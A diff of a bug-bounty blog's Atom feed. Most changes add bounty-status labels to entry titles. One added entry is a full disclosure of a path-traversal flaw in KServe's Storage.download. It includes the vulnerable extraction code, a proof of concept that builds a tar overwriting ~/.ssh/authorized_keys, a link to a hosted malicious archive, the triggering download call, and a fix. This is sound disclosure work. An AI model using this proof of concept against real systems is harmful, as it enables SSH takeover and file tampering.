@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-06-05T14:20:25+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">XSS in Bluestone Electron App when rendering mermaid class diagram Leading to RCE</title><link href="http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Bluestone Electron App when rendering mermaid class diagram Leading to RCE" /><published>2024-06-04T10:31:06+08:00</published><updated>2024-06-04T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-06-06T10:47:44+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">XSS in Bluestone Electron App when rendering mermaid class diagram Leading to RCE(Just Thanks)</title><link href="http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Bluestone Electron App when rendering mermaid class diagram Leading to RCE(Just Thanks)" /><published>2024-06-04T10:31:06+08:00</published><updated>2024-06-04T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
 <p>Due to outdated mermaid 10.0.2 is used to render diagrams, a XSS in class diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims’ local system.</p>
 
 <h3 id="details">Details</h3>
@@ -45,7 +45,7 @@
 <ol>
   <li>Upgrade the mermaid to latest version which is <code class="language-plaintext highlighter-rouge">10.9.1</code>.</li>
   <li>Disable <code class="language-plaintext highlighter-rouge">nodeIntegration</code> in electron app.</li>
-</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid 10.0.2 is used to render diagrams, a XSS in class diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims’ local system.]]></summary></entry><entry><title type="html">XSS in Siyuan Electron App when rendering mermaid block diagram Leading to RCE</title><link href="http://0.0.0.0:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Siyuan Electron App when rendering mermaid block diagram Leading to RCE" /><published>2024-06-04T10:31:06+08:00</published><updated>2024-06-04T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
+</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid 10.0.2 is used to render diagrams, a XSS in class diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims’ local system.]]></summary></entry><entry><title type="html">XSS in Siyuan Electron App when rendering mermaid block diagram Leading to RCE(Just Thanks)</title><link href="http://0.0.0.0:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Siyuan Electron App when rendering mermaid block diagram Leading to RCE(Just Thanks)" /><published>2024-06-04T10:31:06+08:00</published><updated>2024-06-04T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
 <p>Due to outdated mermaid 10.8.0 is used to render block diagrams, a XSS in block diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims local system.</p>
 
 <h3 id="details">Details</h3>
@@ -85,7 +85,7 @@
 
 <p><a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305">https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305</a></p>
 
-<p><a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30">https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid 10.8.0 is used to render block diagrams, a XSS in block diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims local system.]]></summary></entry><entry><title type="html">XSS in Outline when rendering mermaid diagrams</title><link href="http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Outline when rendering mermaid diagrams" /><published>2024-06-02T10:31:06+08:00</published><updated>2024-06-02T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30">https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid 10.8.0 is used to render block diagrams, a XSS in block diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims local system.]]></summary></entry><entry><title type="html">XSS in Outline when rendering mermaid diagrams(No Security Impact!)</title><link href="http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Outline when rendering mermaid diagrams(No Security Impact!)" /><published>2024-06-02T10:31:06+08:00</published><updated>2024-06-02T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
 <p>Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.</p>
 
 <h3 id="details">Details</h3>
@@ -144,7 +144,7 @@
 
 <p><a href="https://github.com/Milkdown/milkdown/issues/1267">https://github.com/Milkdown/milkdown/issues/1267</a></p>
 
-<p><a href="https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D">https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.]]></summary></entry><entry><title type="html">Arbitrary File Overwrite via unstructured-ingest in unstructured</title><link href="http://0.0.0.0:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite via unstructured-ingest in unstructured" /><published>2024-05-29T10:31:06+08:00</published><updated>2024-05-29T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D">https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.]]></summary></entry><entry><title type="html">Arbitrary File Overwrite via unstructured-ingest in unstructured(Just Thanks)</title><link href="http://0.0.0.0:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite via unstructured-ingest in unstructured(Just Thanks)" /><published>2024-05-29T10:31:06+08:00</published><updated>2024-05-29T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Arbitrary File Overwrite via unstructured-ingest with uncompress enabled in unstructured</p>
@@ -677,7 +677,175 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmx
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319">https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release</title><link href="http://0.0.0.0:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release" /><published>2024-05-26T10:31:06+08:00</published><updated>2024-05-26T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319">https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Huntr: Arbitrary File Overwrite in Kserve Storage.download</title><link href="http://0.0.0.0:4000/file-overwrite/2024/05/26/arbitrary-file-overwrite-in-kserve.html" rel="alternate" type="text/html" title="Huntr: Arbitrary File Overwrite in Kserve Storage.download" /><published>2024-05-26T10:31:06+08:00</published><updated>2024-05-26T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/05/26/arbitrary-file-overwrite-in-kserve</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/05/26/arbitrary-file-overwrite-in-kserve.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Huntr: Arbitrary File Overwrite in Kserve Storage.download API</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>0.12.1</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The Kserve python SDK provide extra <a href="https://github.com/kserve/kserve/tree/master/python/kserve#pip-install"><code class="language-plaintext highlighter-rouge">Storage</code></a> module to download model from <a href="https://github.com/kserve/kserve/tree/master/python/kserve#kserve-python-server"><code class="language-plaintext highlighter-rouge">storage providers</code></a>. The <a href="https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L63"><code class="language-plaintext highlighter-rouge">Storage.download</code></a> is called to download and extract the model to file system. However, the function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file.</p>
+
+<p>Using above python sdk, a victim may download model from internet. Fisrt, <a href="https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L63"><code class="language-plaintext highlighter-rouge">Storage.download</code></a> calls <a href="https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L695"><code class="language-plaintext highlighter-rouge">Storage._download_from_uri</code></a> to handle url download, and <code class="language-plaintext highlighter-rouge">Storage._download_from_uri</code> calls <a href="https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L710"><code class="language-plaintext highlighter-rouge">Storage._unpack_archive_file</code></a> to extract the tarball model file.</p>
+
+<p>The <a href="https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L63"><code class="language-plaintext highlighter-rouge">Storage.download</code></a> function:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@staticmethod
+def download(uri: str, out_dir: str = None) -&gt; str:
+    ...
+    if uri.startswith(_GCS_PREFIX):
+        Storage._download_gcs(uri, out_dir)
+    elif uri.startswith(_S3_PREFIX):
+        Storage._download_s3(uri, out_dir)
+    elif uri.startswith(_HDFS_PREFIX) or uri.startswith(_WEBHDFS_PREFIX):
+        Storage._download_hdfs(uri, out_dir)
+    elif re.search(_AZURE_BLOB_RE, uri):
+        Storage._download_azure_blob(uri, out_dir)
+    elif re.search(_AZURE_FILE_RE, uri):
+        Storage._download_azure_file_share(uri, out_dir)
+    elif is_local:
+        return Storage._download_local(uri, out_dir)
+    elif re.search(_URI_RE, uri):
+        return Storage._download_from_uri(uri, out_dir)
+</code></pre></div></div>
+
+<p>The <a href="https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L624"><code class="language-plaintext highlighter-rouge">_download_from_uri</code></a> function:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@staticmethod
+def _download_from_uri(uri, out_dir=None):
+    url = urlparse(uri)
+    ...
+    local_path = os.path.join(out_dir, filename)
+
+    with requests.get(uri, stream=True, headers=headers) as response:
+        ...
+        if encoding == "gzip":
+            stream = gzip.GzipFile(fileobj=response.raw)
+            local_path = os.path.join(out_dir, f"{filename}.tar")
+        else:
+            stream = response.raw
+        with open(local_path, "wb") as out:
+            shutil.copyfileobj(stream, out)
+
+    if mimetype in ["application/x-tar", "application/zip"]:
+        Storage._unpack_archive_file(local_path, mimetype, out_dir)
+</code></pre></div></div>
+
+<p>The <a href="https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L700"><code class="language-plaintext highlighter-rouge">_unpack_archive_file</code></a> function extracts tarball without sanitization:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@staticmethod
+def _unpack_archive_file(file_path, mimetype, target_dir=None):
+    if not target_dir:
+        target_dir = os.path.dirname(file_path)
+
+    try:
+        logger.info("Unpacking: %s", file_path)
+        if mimetype == "application/x-tar":
+            archive = tarfile.open(file_path, "r", encoding="utf-8")
+        else:
+            archive = zipfile.ZipFile(file_path, "r")
+        archive.extractall(target_dir)
+        archive.close()
+</code></pre></div></div>
+
+<p>The Python documentation explains us that tarfiles may have absolute filenames starting with / which could overwite files in system.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: Never extract archives from untrusted sources without prior inspection. 
+It is possible that files are created outside of path, 
+e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>An attacker can create a malicous tar file using following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -cvf hack.tar /home/kali/.ssh/authorized_keys
+</code></pre></div></div>
+
+<p>Then, the attacker will upload the <code class="language-plaintext highlighter-rouge">hack.tar</code> to public server.</p>
+
+<p>I have uploaded one malicous tar file to gitlab for testing: <a href="https://gitlab.com/1159309551xcz/lfs/-/raw/main/hack.tar?ref_type=heads">https://gitlab.com/1159309551xcz/lfs/-/raw/main/hack.tar?ref_type=heads</a></p>
+
+<p>If anyone now downloads tar using <code class="language-plaintext highlighter-rouge">Storage.download</code> api, causing automatically extracting the malicous tar file and overwrite files silently.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from kserve.storage import Storage
+Storage.download("https://gitlab.com/1159309551xcz/lfs/-/raw/main/hack.tar?ref_type=heads")
+</code></pre></div></div>
+<p>We can check the paylod <code class="language-plaintext highlighter-rouge">authorized_keys</code> has been overwriten.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/kali/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
+</code></pre></div></div>
+
+<p>Tested on Google Colab: <a href="https://colab.research.google.com/drive/1zwUsMUbTlDqGJdtLrhIo22HCkgzhQAes?usp=sharing">https://colab.research.google.com/drive/1zwUsMUbTlDqGJdtLrhIo22HCkgzhQAes?usp=sharing</a></p>
+
+<p><img src="https://live.staticflickr.com/65535/53746993646_c00cf1cf03_o_d.png" alt="poc" /></p>
+
+<h2 id="fix">Fix</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@staticmethod
+def _unpack_archive_file(file_path, mimetype, target_dir=None):
+    # See: https://docs.python.org/3/library/tarfile.html#extraction-filters
+    def extraction_filter(member, path):
+        """Run tarfile.tar_filter, but raise the expected ValueError"""
+        # This is only called if the current Python has tarfile filters
+        try:
+            return tarfile.tar_filter(member, path)
+        except tarfile.FilterError as exc:
+            raise ValueError(str(exc))
+
+    if not target_dir:
+        target_dir = os.path.dirname(file_path)
+
+    try:
+        logger.info("Unpacking: %s", file_path)
+        if mimetype == "application/x-tar":
+            archive = tarfile.open(file_path, "r", encoding="utf-8")
+        else:
+            archive = zipfile.ZipFile(file_path, "r")
+        archive.extraction_filter = extraction_filter
+        archive.extractall(target_dir)
+        archive.close()
+
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
+
+<h3 id="ssh-access">SSH Access</h3>
+
+<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
+
+<h3 id="web-servers">Web Servers</h3>
+
+<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L710">https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L710</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release(No Response)</title><link href="http://0.0.0.0:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release(No Response)" /><published>2024-05-26T10:31:06+08:00</published><updated>2024-05-26T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in Langflow Pre-release.</p>
@@ -842,7 +1010,7 @@ async def upload_file(
 
 <p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47</a></p>
 
-<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Google: Local File Inclusion in FHIR Pipelines Controller</title><link href="http://0.0.0.0:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html" rel="alternate" type="text/html" title="Google: Local File Inclusion in FHIR Pipelines Controller" /><published>2024-05-16T10:31:06+08:00</published><updated>2024-05-16T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control</id><content type="html" xml:base="http://0.0.0.0:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Google: Local File Inclusion in FHIR Pipelines Controller($101)</title><link href="http://0.0.0.0:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html" rel="alternate" type="text/html" title="Google: Local File Inclusion in FHIR Pipelines Controller($101)" /><published>2024-05-16T10:31:06+08:00</published><updated>2024-05-16T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control</id><content type="html" xml:base="http://0.0.0.0:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Local File Inclusion in FHIR Pipelines Controller</p>
@@ -990,7 +1158,7 @@ if (dwhFilesManager.doesFileExist(errorResource)) {
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115">https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115</a></p>]]></content><author><name></name></author><category term="file-inclusion" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Store XSS in Gitness markdown comment editor</title><link href="http://0.0.0.0:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html" rel="alternate" type="text/html" title="Store XSS in Gitness markdown comment editor" /><published>2024-05-11T10:31:06+08:00</published><updated>2024-05-11T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115">https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115</a></p>]]></content><author><name></name></author><category term="file-inclusion" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Hackerone: Store XSS in Gitness markdown comment editor($100)</title><link href="http://0.0.0.0:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html" rel="alternate" type="text/html" title="Hackerone: Store XSS in Gitness markdown comment editor($100)" /><published>2024-05-11T10:31:06+08:00</published><updated>2024-05-11T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Store XSS in Gitness markdown comment editor</p>
@@ -1091,151 +1259,4 @@ if (dwhFilesManager.doesFileExist(errorResource)) {
 
 <h2 id="occurrences">Occurrences</h2>
 
